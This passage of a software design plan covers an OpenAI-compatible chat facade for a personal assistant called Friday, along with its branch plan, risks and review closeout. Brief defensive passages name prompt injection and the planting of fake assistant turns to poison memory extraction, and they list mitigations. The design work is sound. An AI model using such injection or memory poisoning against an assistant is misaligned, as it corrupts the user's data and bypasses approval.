last message must be `role=user`; client `system`/`assistant`/`tool`
messages are ignored and never persisted (server history is
authoritative, so a client cannot plant fake assistant turns into memory
extraction); the binding for (token, anchor) whose hashes equal the
client's prior user turns gets the new turn; no match → new conversation.
A regenerate/edit (client history diverges from the binding) **forks**:
a new conversation seeded with copies of the source's server-side
messages up to the divergence (trusted rows, same workspace; extraction
cursor placed after them). An optional `X-Friday-Conversation-Id` pins a
conversation in the bound workspace (404 otherwise). Conversations come
from the audited `create_conversation` and appear in web chat with the
channel badge.

**Models.** `/v1/models` lists `friday` (full pipeline, persisted) and
`friday-lite` (ephemeral: no Friday context, nothing persisted, no
extraction, purpose `facade.ephemeral`) — the target for Open WebUI's
background "task model" (titles, tags, follow-ups). Unknown model → 404
`model_not_found`. Provider/tier selection stays server-side; a client
can never force cloud routing.

**Router degraded to chat-only.** `classify_intent`
(`assistant/services.py:149`) gains `allowed_intents` (default all); the
facade passes `{chat, memory_query, knowledge_query}`, which drops the
tool vocabulary from the router prompt and returns before task-draft
extraction — no draft events, no tool proposals, one gateway call saved.
`tools`, `functions`, a non-`none` `tool_choice`, `n>1` or a JSON-schema
`response_format` → 400 `unsupported_parameter` (ADR-008 decision 6,
explicit rather than silently dropped); `temperature`/`max_tokens`/
`top_p` are accepted and ignored (prompt-version params govern).

**Streaming.** `stream: true` → SSE `chat.completion.chunk`s: a
`delta.role` chunk, content chunks, a final `finish_reason: "stop"`, a
usage chunk if `stream_options.include_usage`, then `data: [DONE]`; a
mid-stream gateway error is `data: {"error": {…}}` then `[DONE]` (message
persisted `partial` by the existing path). `id` is `chatcmpl-<assistant
message id>`; non-streaming returns `chat.completion` with `usage`. To
avoid a third copy of the bytes-to-JSON decode hack
(`integrations/tasks.py:252`), `_stream_assistant_reply` splits into a
structured-event generator plus the existing SSE encoder; web, Telegram
and facade consume structured events (behavior-preserving; existing
assistant tests pin it).

**Limits, audit, usage.** A pre-auth limit in the BFF passthrough
(per client IP when a trusted header exists, else a global ceiling)
rejects invalid-token floods before Django (plan-review round 1,
MEDIUM). `openai` throttle scope per token (Redis,
`FACADE_RATE` default `20/min`), max 2 concurrent streams per token,
`FACADE_MAX_REQUEST_CHARS`; errors in OpenAI's `{"error": {message, type,
param, code}}` shape, `Retry-After` on 429. Audited: token mint/revoke
(now with `kind`), conversation creation and forks, facade auth failures
(rate-limited). `ModelUsage` comes from the gateway as today
(`router.intent` + `chat`, or `facade.ephemeral`) with
`context_report.channel="openai"` and the model alias.

**Tests.** Role × endpoint: `openai` PAT → 200; `cli` PAT → 403 on the
facade; `openai` PAT → 403 on `/conversations`, `/agents`, `/approvals`;
web session refused; expired/revoked → 401 (OpenAI shape); token whose
user lost membership → 404. Isolation: identical first messages under two
tokens never share a conversation; pinning another workspace's
conversation → 404. Mapping: append, fork with copied prefix, regenerate,
pin. Router: with `allowed_intents` the task-draft call never happens
(mocked call count). Streaming: golden-file contract tests (chunk order,
usage chunk, `[DONE]`, mid-stream error) on the FakeAdapter — no real LLM
(rule 5), no `openai` SDK dependency (keeps rule 2's provider-SDK grep
clean). `ModelUsage` rows asserted per call.

**Done when:** contract tests green; a manual Open WebUI smoke
(streaming, history continuity, `friday-lite` as task model) is recorded
in a new "OpenAI-compatible facade" section of
`docs/integrations/README.md`.

## Branch table

| # | Branch | Scope | Depends on |
|---|---|---|---|
| 1 | `feat/p4-security-baseline` | Loopback compose, no committed secrets, MinIO removed, daily-stack override (gunicorn, `next start`), fail-hard `prod.py`, prod default settings module, Redis cache, password validators, refresh blacklist + logout, login/refresh/cost throttles, PAT expiry + audit, `is_agent` never decides, approval request channel, private memories → `_private/`, test DB name, complete `.env.example`, obsolete TODOs | Phase 3 closeout merged |
| 2 | `feat/p4-device-trust` | `is_owner`, `TrustedDevice`, pairing codes, remote key, device-bound JWT, default-deny channel + `IsWebChannel`, signup/login removed, e2e via `bootstrap_owner` + `issue_pairing_code`, owner-only firm creation, ADR-009 + delete-service channel checks | 1 |
| 3 | `feat/p4-design-system` | Semantic tokens + light/dark, primitives incl. safe Markdown, TanStack Query migration, activity summary badge, grouped routed shell, `?workspace=` deep links, Turkish catalog + backend error codes | Phase 3 branch 7; parallel with 1–2 |
| 4 | `feat/p4-chat-redesign` | Markdown, smart scroll, stop/recover, mobile drawer, rename/private, badges, sources, task-draft reconstruction (`Task.source_message`) | 3 |
| 5 | `feat/p4-console-and-inbox` | Routed harness console + repo registry UI, cross-workspace approvals inbox with per-tool renderers and filters, confirmations on every destructive action | 2, 3 |
| 6 | `feat/p4-openai-facade` | `/v1/chat/completions` + `/v1/models`, PAT `kind`, `CHANNEL_OPENAI`, conversation mapping with forks, `friday`/`friday-lite`, chat-only router, OpenAI SSE, structured reply events, throttles | 1, 2; parallel with 3–5 |
| 7 | closeout | Phase notes, MASTER_PLAN §AA row 4 → done, ADR-008 implementation note (decision 2 landed), e2e covering enroll → chat → approve + a facade smoke | 1–6 |

## Out of scope (explicit)

Multi-user anything (no invites, no second-human flows) · firm workspace
deletion/archival (gate-class) · soft-delete/trash for documents or tasks
· WebAuthn/passkeys (a natural later upgrade of the device credential) ·
step-up re-auth for approval decisions (Q4) · SSE for approvals/harness
and harness log streaming (carried forward, needs ASGI) · server-side
chat stream resume · syntax highlighting · a second UI locale · tool
calling, embeddings, `/v1/completions`, `/v1/responses`, audio or image
endpoints on the facade (ADR-008 decision 6) · deploying Friday itself to
a VPS (Phase 5 deploys firm apps) · public-exposure tooling beyond
`compose.daily.yml` and a documented reverse-proxy/Tailscale recipe · the
carried-forward kernel items (owner core memory block, consolidation,
tier-routing map, dynamic runner registry, shared harness engine) · the
orb/visual identity (Phase 6).

## Test strategy

Same discipline as Phases 2–3 (CLAUDE.md rules 5, 7, 8): lint + tests + CI
green per branch, `makemigrations --check`, import-linter contracts
unchanged (no new app). Cross-cutting: role × endpoint for every new
surface against five principals (owner web session, owner PAT `cli`/
`openai`, non-owner user, `is_agent` user, anonymous); one parametrized
channel-matrix test so a future authenticator that forgets its channel
fails CI; isolation tests for every cross-workspace listing (approvals
`scope=all`, activity summary, facade bindings); FakeAdapter + call-count
assertions only — no real LLM, no `openai` SDK; Playwright smoke rebuilt
around enrollment plus a phone-width pass. **Release-gate regressions**
(escalate per the orchestration protocol's CRITICAL/HIGH rule):
`is_agent` or a low-trust channel deciding, a revoked device keeping
access, a private memory in the main vault tree, markdown rendering an
image or raw HTML.

## Risks

- **R1 — Owner lockout** (all devices lost, no remote key). Host shell +
  `issue_pairing_code` always recovers; `manage.py revoke_all_devices`
  covers theft. Residual: host shell access is the root of trust.
- **R2 — A stolen, unlocked trusted device holds full owner authority,**
  approvals included. Instant revocation from any other device, idle
  expiry, audited enrollment, new-device banner; step-up deferred (Q4).
- **R3 — Client-IP trust for LAN gating.** Route handlers do not expose
  the socket address reliably and `X-Forwarded-For` is client-controlled:
  IP only from a configured proxy header over a BFF-key-authenticated hop,
  unknown IP → PIN refused in prod. Branch 2 verifies what `next start`
  actually sets before relying on it.
- **R4 — The default-deny flip breaks things quietly** (anything relying
  on "no principal = web"). Shared fixture, channel matrix and a full e2e
  run land in the same commit as the flip.
- **R4b — Concurrency budget on the daily stack** (plan-review round 1,
  HIGH). gunicorn gthread pins one thread per open SSE stream (web chat,
  facade ≤2/token) while the UI polls. `compose.daily.yml` sizes workers
  × threads for ≥8 concurrent streams plus polling headroom (default 3 ×
  16 = 48 slots, env-tunable), and branch 6's "done when" includes a
  recorded load check (8 parallel SSE streams + 4 polling tabs, no request
  queued > 2s). ASGI remains the long-term answer (Q7).
- **R5 — Redis becomes load-bearing for web** (cache, throttles): Redis
  down → throttled endpoints fail closed (503), chat/facade included.
- **R6 — Facade as prompt-injection and cost vector.** Its content reaches
  memory only as `pending_approval` suggestions, the overlay stays
  web-only (`assistant/context.py:250`), `private` never reaches a
  payload, the channel has no tools, background tasks go to
  `friday-lite`, per-token throttle and concurrency caps bound cost.
- **R7 — Conversation-mapping surprises.** Forks keep server history,
  are visible in web chat; the pinning header gives determinism.
- **R8 — Scope creep across three frontend branches.** Per-branch "done
  when", no re-planning of Phase 3 branch 7, no visual-identity work.
- **R9 — New dependencies** (`@tanstack/react-query`, `next-themes`,
  `sonner`, `react-markdown`, `remark-gfm`, `gunicorn`): locked, covered by
  Dependabot, each justified; `django-storages`/`boto3` leave.
- **R10 — Phase 3 closeout slips** (branch 7 in progress, the integration PR — former repository, PR #26 — unmerged):
  branch 3 may start in a worktree but merges only after Phase 3 branch 7.

## Open questions (with recommended answers)

- **Q1 — Owner hard-deletes vs gate-class "delete" (§O).** Resolved:
  deletes become reversible (trash + retention), which puts them in
  ADR-008's existing confirm-class; permanent purge is gate-class
  (ADR-009, branch 2).
- **Q2 — Remote key: reuse/extend the PAT model?** No — separate
  `RemoteAccessKey` (branch 2). Reusable until rotated (single-use risks a
  lockout mid-trip), audited, default off.
- **Q3 — Does the owner keep a password?** Only as a Django-admin
  break-glass credential (validated, never accepted by any API endpoint);
  `admin/` routed only when `DJANGO_ADMIN_ENABLED` (dev true, prod false);
  `bootstrap_owner` sets `is_staff`. The web has no password field.
- **Q4 — Step-up PIN for approval decisions?** Not in Phase 4; revisit in
  Phase 6, where voice already requires an on-screen confirm.
- **Q5 — Rotate the device secret on every session mint?** No —
  concurrent tabs would race into false reuse detection; idle expiry and
  instant revocation cover the threat.
- **Q6 — Exposure topology.** Document a private overlay (Tailscale/
  WireGuard) as the default; a TLS reverse proxy works via
  `compose.daily.yml` + `TRUSTED_CLIENT_IP_HEADER`; no security property
  depends on the overlay.
- **Q7 — Data layer and live updates.** TanStack Query v5; conditional
  polling + one summary endpoint now, SSE with harness log streaming once
  ASGI is adopted (branch 3 rationale).
- **Q8 — Facade fork semantics.** Fork with a copied server-side prefix;
  appending regenerations to one conversation pollutes history and memory.
- **Q9 — Do facade conversations feed memory extraction?** Yes for
  `friday` (suggestions stay `pending_approval`), never for `friday-lite`.
- **Q10 — Facade model names.** Only `friday` and `friday-lite`; tier
  aliases wait for Phase 5's tier-routing map.
- **Q11 — PAT expiry.** 90-day default, 365-day max, existing tokens
  backfilled to now + 30 days, expiry shown in the token list.
- **Q12 — Explicit `is_owner` vs "the first user".** Explicit flag with a
  partial unique constraint; single-owner is enforced at device
  enrollment, so tests can keep creating several users for isolation.

## Plan-review round 1 (2026-09-27, Sonnet 5 reviewer) — incorporated

- CRITICAL — ADR-009 dropped the "reversible" criterion for document/task
  hard deletes → deletes become soft (trash + retention), purge is
  gate-class; ADR-008's definition stays intact.
- HIGH — global `enroll` throttle as a self-DoS → per-source + global
  two-tier throttle, residual risk documented.
- HIGH — client-IP mechanism resting on an unverified runtime fact →
  step-0 spike with both outcomes specified up front.
- HIGH — no concurrency budget for SSE on gthread → R4b sizing + a
  recorded load check in branch 6.
- MEDIUM — revocation vs in-flight SSE; polling-migration scope; own-
  session migration at the flip; facade pre-auth flood limit; delete
  condition asymmetry (resolved by the ADR-009 rewrite).
- LOW — CI guard for the web-client fixture flip.

## Closeout (2026-09-27)

Every branch was reviewed by an independent Sonnet 5 subagent until
APPROVE, merged `--no-ff` into `integ/phase-4` with the Playwright smoke
green locally, and the phase went to `main` through the integration PR (former repository, PR #27).

| # | Branch | Review | Notes |
|---|---|---|---|
| 1 | `feat/p4-security-baseline` | APPROVE (round 2) | Throttles fail closed (503) on a cache outage; daily gunicorn 3×16 |
| 2 | `feat/p4-device-trust` | APPROVE (round 3) | Step-0 client-IP spike recorded above; round 1 added Q3 (`DJANGO_ADMIN_ENABLED`, owner `is_staff`) and made `is_owner` read-only in admin; the merge with branch 4 decided that trashing a task releases its chat-draft link (ADR-009 Consequences) |
| 3 | `feat/p4-design-system` | APPROVE (round 1) | `IsWebChannel`/`IsOwner` got stable codes `channel_forbidden`/`owner_required` when merged with branch 2; "Cihazlar" is its own `/devices` route |
| 4 | `feat/p4-chat-redesign` | APPROVE (round 1) | Reconciliation is client-only (no SSE `start` event); draft confirmation detects the unique violation by SQLSTATE + constraint name |
| 5 | `feat/p4-console-and-inbox` | APPROVE (round 1) | Adds read-only `self_repo_status` and `/auth/me` `trash_retention_days`; approvals list unpaginated |
| 6 | `feat/p4-openai-facade` | APPROVE (round 1) | `openai`-client smoke + R4b load check recorded in the branch report; e2e `facade.e2e.ts` covers models, completion, streaming, 401, `tools` refusal |

**Owner-only follow-up:** the manual Open WebUI smoke required by branch
6's "done when" (streaming, history continuity, `friday-lite` as task
model) needs Open WebUI installed; record it in
`docs/integrations/README.md` ("OpenAI-compatible facade").

**Carried forward** (MASTER_PLAN §AA): facade binding retention
(`FacadeConversation` rows are never pruned); the BFF pre-auth limiter
is per process; `fork_conversation`'s no-usable-cut fallback copies the
whole source conversation; approvals list pagination; the e2e smoke
reuses the owner on a CI retry, so a failed first attempt can leave data
the retry trips over.

